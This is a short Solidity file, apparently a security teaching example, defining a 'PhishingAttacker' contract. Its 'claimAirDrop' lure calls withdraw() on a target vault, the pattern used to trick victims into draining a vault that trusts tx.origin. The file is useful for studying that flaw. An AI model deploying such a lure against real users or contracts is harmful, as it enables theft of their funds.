// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract PhishingAttacker {
    IVault vault;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    function claimAirDrop() public payable {
        vault.withdraw();
    }
}
